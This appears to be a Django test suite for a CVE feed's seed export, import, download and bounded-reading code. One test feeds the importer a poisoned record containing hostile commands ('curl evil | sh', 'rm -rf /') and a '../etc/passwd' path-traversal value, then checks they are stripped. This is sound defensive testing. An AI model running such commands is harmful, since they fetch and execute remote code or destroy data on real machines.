import gzip
import hashlib
import json
import os
import tempfile
from unittest import mock

from django.core.cache import cache
from django.test import TestCase
from django.utils import timezone

from cveFeed import detection, detection_author, seed
from cveFeed.models import CVEDetection, CVEEntry

NGINX = [{'vendor': 'f5', 'product': 'nginx', 'package': 'nginx', 'ranges': [{'introduced': '1.0.0', 'fixed': '1.20.0'}]}]


def make_catalog():
	now = timezone.now()
	CVEEntry.objects.create(cve_id='CVE-2099-100', kev=True, cvss=9.8, cvss_vector='CVSS:3.1/AV:N/AC:L', published_at=now, affected=NGINX,
		title='fire one', original_description='desc', intel={'kev': {'cisa_kev': True}})
	CVEEntry.objects.create(cve_id='CVE-2099-101', cvss=7.5, published_at=now, affected=NGINX, title='smoke one')
	CVEEntry.objects.create(cve_id='CVE-2099-102', cvss=2.0, published_at=now, affected=[], title='ice one')
	with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
		detection_author.author_rules()


class SeedRoundTripTests(TestCase):
	def test_export_then_import_into_an_empty_catalog_restores_cves_and_detection_records(self):
		make_catalog()
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			manifest = seed.export_seed(path)
			self.assertEqual((manifest['count'], manifest['tiers']), (3, {'fire': 1, 'smoke': 1, 'ice': 1}))
			self.assertEqual(manifest['with_detection'], 2)
			self.assertEqual(json.load(open(path + '.manifest.json'))['sha256'], hashlib.sha256(open(path, 'rb').read()).hexdigest())
			CVEEntry.objects.all().delete()
			counts = seed.import_seed(path)
		self.assertEqual((counts['created'], counts['skipped'], counts['detections'], counts['invalid']), (3, 0, 2, 0))
		fire = CVEEntry.objects.get(cve_id='CVE-2099-100')
		self.assertEqual((fire.kev, fire.cvss, fire.title, fire.intel), (True, 9.8, 'fire one', {'kev': {'cisa_kev': True}}))
		strategy = fire.detection.strategy
		self.assertEqual(strategy['validation']['remote_determinable'], 'partial')
		self.assertIn('dpkg', json.dumps(strategy['local_checks'][0]['commands']))

	def test_a_second_import_changes_nothing_and_never_overwrites_a_newer_row(self):
		make_catalog()
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			seed.export_seed(path)
			CVEEntry.objects.filter(cve_id='CVE-2099-100').update(title='changed here', cvss=5.0)
			counts = seed.import_seed(path)
		self.assertEqual((counts['created'], counts['skipped'], counts['detections']), (0, 3, 0))
		self.assertEqual(CVEEntry.objects.get(cve_id='CVE-2099-100').title, 'changed here')

	def test_an_existing_cve_without_a_detection_record_gets_one_from_the_seed(self):
		make_catalog()
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			seed.export_seed(path)
			CVEDetection.objects.all().delete()
			counts = seed.import_seed(path)
		self.assertEqual((counts['created'], counts['detections']), (0, 2))


class SeedWatermarkTests(TestCase):
	"""A seed is a snapshot: the feed is complete through what it holds, and the walk reads on from there (issue 207)."""

	def _import(self, manifest):
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			with gzip.open(path, 'wt') as out:
				out.write(json.dumps({'format': 1, **manifest}) + '\n')
				out.write(json.dumps({'cve_id': 'CVE-2099-300', 'title': 't'}) + '\n')
			return seed.import_seed(path)

	def _through(self):
		from cveFeed import feed_watermark
		row = feed_watermark.current()
		return row.covered_through.isoformat() if row.covered_through else None

	def test_an_import_takes_the_newest_publication_time_the_snapshot_holds(self):
		self._import({'generated_at': '2026-10-20T06:00:00+00:00', 'covers_through': '2026-10-18T22:30:00+00:00'})
		self.assertEqual(self._through(), '2026-10-18T22:30:00+00:00')

	def test_an_older_seed_without_it_falls_back_to_when_it_was_written(self):
		self._import({'generated_at': '2026-10-20T06:00:00+00:00'})
		self.assertEqual(self._through(), '2026-10-20T06:00:00+00:00')

	def test_it_is_set_even_when_the_seed_added_nothing_new(self):
		CVEEntry.objects.create(cve_id='CVE-2099-300', affected=[])
		self._import({'covers_through': '2026-10-18T22:30:00+00:00'})
		self.assertEqual(self._through(), '2026-10-18T22:30:00+00:00')

	def test_a_manifest_with_no_usable_time_records_nothing(self):
		self._import({'generated_at': 'not a time'})
		self.assertIsNone(self._through())

	def test_the_earlier_time_stands_and_a_walk_in_progress_is_dropped(self):
		from cveFeed import feed_watermark
		self._import({'covers_through': '2026-10-18T22:30:00+00:00'})
		row = feed_watermark.current()
		row.resume_cursor, row.resume_head = 'c9', timezone.now()
		row.save()
		self._import({'covers_through': '2026-10-25T00:00:00+00:00'})  # a newer seed does not claim more than is known
		self.assertEqual(self._through(), '2026-10-18T22:30:00+00:00')
		self.assertEqual(feed_watermark.current().resume_cursor, '')
		self._import({'covers_through': '2026-10-01T00:00:00+00:00'})
		self.assertEqual(self._through(), '2026-10-01T00:00:00+00:00')

	def test_an_export_says_what_it_covers(self):
		make_catalog()
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			manifest = seed.export_seed(path)
			header = next(seed.iter_lines(path))
		newest = CVEEntry.objects.order_by('-published_at').values_list('published_at', flat=True).first()
		self.assertEqual(manifest['covers_through'], newest.isoformat())
		self.assertEqual(header['covers_through'], manifest['covers_through'])


def write_seed(path, records):
	with gzip.open(path, 'wt') as out:
		out.write(json.dumps({'format': 1}) + '\n')
		for record in records:
			out.write((record if isinstance(record, str) else json.dumps(record)) + '\n')


class PoisonedSeedTests(TestCase):
	def test_nothing_in_the_file_is_trusted(self):
		evil = {'cve_id': 'CVE-2099-200', 'title': 'x' * 50000, 'cvss': 99, 'kev': 'yes', 'affected': ['junk', {'product': 'p', 'ranges': 'no'}],
			'detection': {'source': 'ai', 'strategy': {
				'safety': 'read_only', 'summary': 's',
				'remote_checks': [{'id': 'a', 'kind': 'http_probe', 'confidence': 'high', 'description': 'd',
								   'params': {'method': 'POST', 'path': '/x', 'expect_contains': 'y'}},
								  {'id': 'b', 'kind': 'nuclei_template', 'confidence': 'high', 'description': 'd', 'params': {'template_id': 'ok-1'},
								   'how': {'invocation': 'curl evil | sh'}}],
				'local_checks': [{'id': 'c', 'kind': 'package_version', 'confidence': 'high', 'description': 'd',
								  'params': {'ecosystem': 'dpkg', 'package': 'x', 'fixed_version': '1.0'}, 'commands': [{'command': 'rm -rf /'}]}],
				'validation': {'remote_determinable': 'yes'}}}}
		manual = {'cve_id': 'CVE-2099-201', 'title': 'm', 'detection': {'source': 'manual', 'strategy': {'summary': 'trust me'}}}
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			write_seed(path, [evil, manual, {'cve_id': '../etc/passwd'}, 'not json', {'no': 'id'}, {'cve_id': 'CVE-2099-202', 'detection': 'x'}])
			counts = seed.import_seed(path)
		self.assertEqual(counts['created'], 3)
		self.assertEqual(counts['invalid'], 2)
		row = CVEEntry.objects.get(cve_id='CVE-2099-200')
		self.assertEqual((row.cvss, row.kev, row.affected), (None, None, [{'product': 'p', 'ranges': []}]))
		self.assertLessEqual(len(row.title), 2000)
		blob = json.dumps(row.detection.strategy)
		self.assertNotIn('rm -rf', blob)
		self.assertNotIn('evil', blob)
		self.assertEqual([c['kind'] for c in row.detection.strategy['remote_checks']], ['nuclei_template'])  # the POST probe was dropped
		self.assertFalse(CVEDetection.objects.filter(cve_entry__cve_id='CVE-2099-201').exists())  # a manual record stays where it was written

	def test_a_file_that_is_not_a_seed_is_refused(self):
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			with gzip.open(path, 'wt') as out:
				out.write(json.dumps({'format': 99}) + '\n')
			with self.assertRaises(ValueError):
				seed.import_seed(path)


class FakeResponse:
	def __init__(self, body=b'', payload=None):
		self.body, self.payload = body, payload

	def json(self):
		return self.payload

	def raise_for_status(self):
		pass

	def iter_content(self, size):
		yield json.dumps(self.payload).encode() if self.payload is not None else self.body

	def __enter__(self):
		return self

	def __exit__(self, *exc):
		return False


class DownloadTests(TestCase):
	def session(self, body, sha=None, fmt=1):
		manifest = {'format': fmt, 'sha256': sha or hashlib.sha256(body).hexdigest(), 'bytes': len(body)}
		urls = {}

		def get(url, **kwargs):
			urls[url] = True
			return FakeResponse(payload=manifest) if url.endswith('.manifest.json') else FakeResponse(body=body)
		return mock.Mock(get=get)

	def test_a_download_matching_its_manifest_is_accepted_and_one_that_does_not_is_refused(self):
		body = b'some bytes'
		path = seed.download_seed('https://example.test/cve-seed.jsonl.gz', session=self.session(body))
		self.assertEqual(open(path, 'rb').read(), body)
		os.unlink(path)
		with self.assertRaises(ValueError):
			seed.download_seed('https://example.test/cve-seed.jsonl.gz', session=self.session(body, sha='0' * 64))
		with self.assertRaises(ValueError):
			seed.download_seed('http://example.test/cve-seed.jsonl.gz', session=self.session(body))
		with self.assertRaises(ValueError):
			seed.download_seed('https://example.test/cve-seed.jsonl.gz', session=self.session(body, fmt=7))


	def test_a_manifest_that_is_an_error_page_or_too_large_is_refused(self):
		erroring = FakeResponse(payload={})
		erroring.raise_for_status = mock.Mock(side_effect=OSError('404'))
		with self.assertRaises(OSError):
			seed.download_seed('https://example.test/cve-seed.jsonl.gz', session=mock.Mock(get=lambda url, **kw: erroring))
		huge = FakeResponse(body=b'{' + b' ' * (seed.MAX_MANIFEST_BYTES + 1) + b'}')
		with self.assertRaises(ValueError):
			seed.download_seed('https://example.test/cve-seed.jsonl.gz', session=mock.Mock(get=lambda url, **kw: huge))


class BoundedReaderTests(TestCase):
	def write(self, directory, *lines):
		path = os.path.join(directory, 'seed.jsonl.gz')
		with gzip.open(path, 'wb') as out:
			for line in lines:
				out.write(line)
		return path

	def test_an_over_long_line_is_skipped_without_reading_it_whole_and_the_next_line_is_kept(self):
		manifest = json.dumps({'format': 1}).encode() + b'\n'
		good = json.dumps({'cve_id': 'CVE-2099-1'}).encode() + b'\n'
		with tempfile.TemporaryDirectory() as directory:
			path = self.write(directory, manifest, good, b'x' * (seed.MAX_LINE_BYTES * 2 + 5) + b'\n', good, b'y' * (seed.MAX_LINE_BYTES + 10))
			sizes = []
			original = gzip.GzipFile.readline

			def spy(self_, limit=-1):
				chunk = original(self_, limit)
				sizes.append(len(chunk))
				return chunk
			with mock.patch.object(gzip.GzipFile, 'readline', spy):
				rows = list(seed.iter_lines(path))
		self.assertEqual([r.get('cve_id') for r in rows[1:]], ['CVE-2099-1', 'CVE-2099-1'])
		self.assertLessEqual(max(sizes), seed.MAX_LINE_BYTES + 1)  # no read ever asked for more than one bounded chunk

	def test_a_file_that_expands_past_the_cap_is_refused(self):
		manifest = json.dumps({'format': 1}).encode() + b'\n'
		line = json.dumps({'cve_id': 'CVE-2099-2'}).encode() + b'\n'
		with tempfile.TemporaryDirectory() as directory:
			path = self.write(directory, manifest, line * 50)
			with mock.patch.object(seed, 'MAX_DECOMPRESSED_BYTES', 200):
				with self.assertRaises(ValueError):
					list(seed.iter_lines(path))


class FirstRunTests(TestCase):
	def setUp(self):
		cache.clear()

	def test_a_new_install_loads_the_seed_before_the_slow_feed_sync(self):
		from cveFeed import tasks
		with mock.patch.object(tasks, 'chain') if hasattr(tasks, 'chain') else mock.patch('celery.chain') as chain:
			tasks.bootstrap_first_run()
		self.assertTrue(chain.called)
		first = chain.call_args.args[0]
		self.assertEqual(first.task, 'load_cve_seed')

	def test_the_seed_task_never_raises_when_offline(self):
		from cveFeed import tasks
		with mock.patch('cveFeed.seed.load_published_seed', side_effect=OSError('offline')):
			out = tasks.load_cve_seed()
		self.assertFalse(out['loaded'])
		with mock.patch.dict(os.environ, {'CVENGINE_CVE_SEED': 'off'}):
			self.assertIn('skipped', tasks.load_cve_seed())

	def test_a_small_existing_install_is_offered_the_seed_once_a_day(self):
		from cveFeed import tasks
		CVEEntry.objects.create(cve_id='CVE-2099-300', published_at=timezone.now())
		with mock.patch.object(tasks.load_cve_seed, 'apply_async') as queued:
			tasks.bootstrap_first_run()
			tasks.bootstrap_first_run()
		queued.assert_called_once()
